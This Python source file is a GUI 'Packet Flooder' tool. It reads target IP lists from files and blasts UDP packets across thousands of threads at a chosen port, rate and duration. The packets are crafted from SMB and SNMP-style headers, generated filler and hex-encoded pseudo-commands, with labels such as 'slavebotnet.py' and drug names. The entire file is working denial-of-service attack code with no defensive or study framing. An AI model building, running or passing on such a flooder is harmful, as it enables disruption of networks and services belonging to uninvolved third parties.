import random
import socket
import time
import psutil
from tkinter import Tk, Label, Entry, Button, filedialog, Listbox, END, Checkbutton, BooleanVar, messagebox
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, TensorDataset
import numpy as np
from concurrent.futures import ThreadPoolExecutor, as_completed
import gc

# Preallocate 8 GB of RAM
fixed_memory = np.zeros((8 * 1024 * 1024 * 1024 // np.dtype(np.uint8).itemsize,), dtype=np.uint8)  # 8 GB

# Check if CUDA is available
use_cuda = torch.cuda.is_available()
device = torch.device("cuda" if use_cuda else "cpu")
print(f'Using device: {device}')
gc.enable()

# Define the buffers
buff0 = b"\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x36\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00"
buff1 = b"\x30\x37\x02\x01\x01"
buff2 = b"6c6f6f703a20207365742e7461726765742873747265657473637261706a756e6b69652e6576696c282272616e646f6d22293b206c6f636b2e74617267657428293b207365742e766f6c756d6528223130302522293b207365742e706c61796261636b28706c61792e746f6e6528226472756d7322293b20676f746f286c6f6f702829293b202073747265657473637261706a756e6b69652e6576696c28646967657374286c6f6f702829293b2020656e746572206f6b7a796f6b20656e746572206f6b206f6b206f6b206f6b6f6b6f6b"

# Additional buffer packets with custom labels
buff3_options = [
    (b"61637469766174652e7269636b636f6e6628293b", "cocaine"),
    (b"72756e2e66696c6528226e657420646973636f766572792e7079222920", "lsd"),
    (b"72657365742e62696e61727928293b", "rohypnol"),
    (b"61637469766174652e7269636b636f6e6628293b", "mdma"),
    (b"64697361626c652e736f756e646361726428293b", "vicodin"),
    (b"72657365742e6d696469636f6e74726f6c6c657228293ba61637469766174652e766f6c7461676564697669646572286170706c792e766f6c74616765646976696465722829293b", "painkiller"),
    (b"72657365742e696e74657270726574657228293b", "rivotril"),
    (b"7365742e6361727269657228223230687a22293b", "medium painkiller"),
    (b"72756e2e66696c652822736c617665626f746e65742e707922293b", "rush"),
    (b"72657365742e74727574687461626c6528293b", "truthserum"),
    (b"\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00", "penicilin"),
    (b"0x73 0x68 0x6f 0x72 0x74 0x63 0x69 0x72 0x63 0x75 0x69 0x74 0x2e 0x66 0x75 0x73 0x65 0x62 0x6f 0x78 0x28 0x22 0x30 0x56 0x22 0x29 0x3b", "anti cannibal pill"),
    (b"66756c6c6475706c657872657665616c6772696428293b", "revealnetwork"),
    (b"73796e6368726f6e6973652e636865636b706f696e742822626c756522293b", "synchronise(bluecp)"),
    (b"73796e6368726f6e6973652e636865636b706f696e74282272656422293b", "synchronise(redcp)"),
    (b"73796e6368726f6e6973652e636865636b706f696e74282279656c6c6f7722293b", "synchronise(yellowcp)"),
    (b"73796e6368726f6e6973652e636865636b706f696e742822677265656e22293b", "synchronise(greencp)"),
    (b"73796e6368726f6e6973652e636865636b706f696e742822626c61636b22293b", "synchronise(blackcp)"),
    (b"6163636570746269742e6f6b28293b", "acceptbit"),
    (b"72756e2e717565756528293b", "grindthegears"),
]

selected_buff3 = buff3_options[0][0]  # Default selection

def select_buff3(option_index):
    global selected_buff3
    selected_buff3 = buff3_options[option_index][0]
    print(f"Selected buff3 packet: {selected_buff3}")

# Step 1: Define a simple neural network
class SimpleNet(nn.Module):
    def __init__(self):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(10, 50)
        self.fc2 = nn.Linear(50, 100)
        self.fc3 = nn.Linear(100, 100)  # Output size to match the payload length

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = torch.relu(self.fc2(x))
        x = torch.sigmoid(self.fc3(x))  # Using sigmoid to get output between 0 and 1
        return x

# Initialize the neural network
model = SimpleNet().to(device)

# Dummy training data
X_train = torch.randn(1000, 10).to(device)
y_train = torch.randn(1000, 100).to(device)

# Create a DataLoader
train_dataset = TensorDataset(X_train, y_train)
train_loader = DataLoader(train_dataset, batch_size=16, shuffle=False)

# Define loss function and optimizer
criterion = nn.MSELoss()
optimizer = optim.Adam(model.parameters(), lr=0.001)

# Train the network (simplified for this example)
num_epochs = 5
for epoch in range(num_epochs):
    model.train()
    running_loss = 0.0
    for inputs, targets in train_loader:
        optimizer.zero_grad()
        outputs = model(inputs)
        loss = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        running_loss += loss.item()
    print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {running_loss/len(train_loader):.4f}')

# Function to perform calculations on GPU using the trained network
def calculate_on_gpu():
    model.eval()
    with torch.no_grad():
        random_input = torch.randn(1, 10).to(device)
        payload = model(random_input).cpu().numpy()
        # Convert the payload to bytes
        payload_bytes = bytes(np.round(payload[0] * 255).astype(np.uint8))
        # Concatenate the buffers
        full_payload = buff0 + payload_bytes + buff1 + payload_bytes + buff2 + payload_bytes + selected_buff3
    return full_payload

# Function to monitor memory usage for garbage collection purposes
def monitor_memory():
    mem = psutil.virtual_memory()
    # Log memory usage
    print(f"Total memory: {mem.total}, Available memory: {mem.available}, Used memory: {mem.used}")
    if mem.available < mem.total * 0.1:
        print("Low memory detected, performing garbage collection.")

def flood(target_ip, target_port, duration, packet_rate, ips_array):
    global automated_mode, interval
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_change_time = time.time()
    packet_index = 0
    try:
        while time.time() < end_time:
            try:
                if automated_mode and time.time() >= packet_change_time + interval:
                    packet_index = (packet_index + 1) % len(buff3_options)
                    select_buff3(packet_index)
                    packet_change_time = time.time()
                v = calculate_on_gpu()
                for ip in ips_array:
                    sock.sendto(v, (ip, target_port))
                time.sleep(1 / packet_rate)
                print(f"Flooding IPs: {ips_array}, Target Port: {target_port}")
                monitor_memory()  # Monitor memory usage during the flood
            except Exception as e:
                print(f"Error during sending packet: {e}")
    finally:
        gc.collect()
        torch.cuda.empty_cache()  # Clear GPU cache after each calculation
        print(f"Closed socket for IPs: {ips_array}")

# List to store loaded IPs and their filenames
ips_dict = {}

def load_ip_files():
    global ips_dict
    file_paths = filedialog.askopenfilenames(filetypes=[("Text files", "*.txt")])
    if file_paths:
        for file_path in file_paths:
            with open(file_path, 'r') as file:
                new_ips = file.readlines()
            new_ips = [ip.strip() for ip in new_ips if ip.strip()]
            if file_path not in ips_dict:
                ips_dict[file_path] = new_ips
                loaded_files_box.insert(END, file_path)
                print(f"Loaded IPs from file {file_path}: {new_ips}")
            else:
                print(f"Ignore file {file_path} as it's already loaded.")
    else:
        print("No files selected.")


def initiate_flood():
    global automated_mode, interval
    target_port = int(port_entry.get())
    duration = int(duration_entry.get())
    rate = int(rate_entry.get())
    interval = int(interval_entry.get())

    # Ensure the duration is greater than or equal to the interval
    if duration < interval:
        messagebox.showerror("Input Error", "Duration cannot be less than the change interval.")
        return
    
    automated_mode = automate_var.get()
    automate_label.config(text="Automate Active" if automated_mode else "Automate Inactive")

    # Disable buff3 selection buttons in automated mode
    for button in buff3_buttons:
        button.config(state="disabled" if automated_mode else "normal")
    
    with ThreadPoolExecutor(max_workers=4096) as executor:
        futures = []
        for file_path, ips in ips_dict.items():
            futures.append(executor.submit(flood, target_ip="example.com", target_port=target_port, duration=duration, packet_rate=rate, ips_array=ips))
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Thread generated an exception: {e}")

def on_automate_checkbox_changed(*args):
    global automated_mode
    automated_mode = automate_var.get()
    automate_label.config(text="Automate Active" if automated_mode else "Automate Inactive")
    print(f"Automate mode changed: {automated_mode}")
    # Disable buff3 selection buttons in automated mode
    for button in buff3_buttons:
        button.config(state="disabled" if automated_mode else "normal")

root = Tk()
root.title("Packet Flooder")

# Label to display CPU/GPU usage
device_label_text = "Using GPU" if use_cuda else "Using CPU"
device_label = Label(root, text=device_label_text)
device_label.grid(row=0, columnspan=2)

port_label = Label(root, text="Target Port:")
port_label.grid(row=1, column=0)
port_entry = Entry(root)
port_entry.grid(row=1, column=1)

duration_label = Label(root, text="Duration (seconds):")
duration_label.grid(row=2, column=0)
duration_entry = Entry(root)
duration_entry.grid(row=2, column=1)

rate_label = Label(root, text="Packet Rate (per second):")
rate_label.grid(row=3, column=0)
rate_entry = Entry(root)
rate_entry.grid(row=3, column=1)

interval_label = Label(root, text="Change Interval (seconds):")
interval_label.grid(row=4, column=0)
interval_entry = Entry(root)
interval_entry.grid(row=4, column=1)

automate_var = BooleanVar()
automate_var.trace_add("write", on_automate_checkbox_changed)
automate_button = Checkbutton(root, text="Automate Mode (Goes through each selectable packets one-by-one with the change interval given and locks the select packet feature) ", variable=automate_var)
automate_button.grid(row=5, column=0, columnspan=2)

automate_label = Label(root, text="Automate Inactive")
automate_label.grid(row=6, column=0, columnspan=2)

load_file_button = Button(root, text="Load IPs from File", command=load_ip_files)
load_file_button.grid(row=7, columnspan=2)

loaded_files_label = Label(root, text="Files Loaded:")
loaded_files_label.grid(row=8, column=0)
loaded_files_box = Listbox(root, width=40)
loaded_files_box.grid(row=8, column=1)

# Function to create buttons for selecting buff3 packet
buff3_buttons = []

def create_buff3_buttons():
    num_columns = 4  # Number of columns to organize the buttons
    for i, (packet, label) in enumerate(buff3_options):
        row = i // num_columns + 9
        column = i % num_columns
        button = Button(root, text=label, command=lambda idx=i: select_buff3(idx))
        button.grid(row=row, column=column)
        buff3_buttons.append(button)

# Call the function to create buff3 selection buttons
create_buff3_buttons()

start_button = Button(root, text="Start Flood", command=initiate_flood)
start_button.grid(row=9 + len(buff3_options) // 4, columnspan=2)

root.mainloop()
